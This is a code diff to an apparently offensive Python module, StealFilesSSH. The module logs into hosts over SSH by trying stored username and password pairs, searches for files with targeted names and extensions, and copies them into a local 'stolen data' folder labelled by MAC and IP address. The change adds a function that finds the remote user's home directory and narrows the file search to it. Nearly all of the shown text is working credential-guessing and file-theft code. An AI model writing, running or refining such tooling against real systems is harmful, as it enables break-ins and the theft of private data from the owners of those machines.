@@ -63,11 +63,28 @@ class StealFilesSSH:
                 if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                    any(file_name in file for file_name in self.shared_data.steal_file_names):
                     matching_files.append(file)
-            logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
+            display_dir = dir_path if dir_path == '/' else dir_path.rstrip('/') + '/'
+            logger.info(f"Found {len(matching_files)} matching files in {display_dir}")
             return matching_files
         except Exception as e:
             logger.error(f"Error finding files in directory {dir_path}: {e}")
             raise
+
+    @staticmethod
+    def _get_remote_home(ssh, username):
+        """Return the remote home directory for the authenticated user."""
+        try:
+            stdin, stdout, stderr = ssh.exec_command('echo -n $HOME')
+            home = stdout.read().decode().strip()
+            if home:
+                return home
+        except Exception as e:
+            logger.warning(f"Unable to determine $HOME via environment: {e}")
+
+        # Fallback to common convention
+        fallback_home = f"/home/{username}" if username not in {'root', ''} else '/root'
+        logger.debug(f"Falling back to home directory guess: {fallback_home}")
+        return fallback_home
 
     def steal_file(self, ssh, remote_file, local_dir):
         """
@@ -134,7 +151,9 @@ class StealFilesSSH:
                     try:
                         logger.info(f"Trying credential {username}:{password} for {ip}")
                         ssh = self.connect_ssh(ip, username, password)
-                        remote_files = self.find_files(ssh, '/')
+                        home_dir = self._get_remote_home(ssh, username)
+                        logger.info(f"Searching for target files under {home_dir} on {ip}")
+                        remote_files = self.find_files(ssh, home_dir)
                         mac = row['MAC Address']
                         local_dir = os.path.join(self.shared_data.datastolendir, f"ssh/{mac}_{ip}")
                         if remote_files:
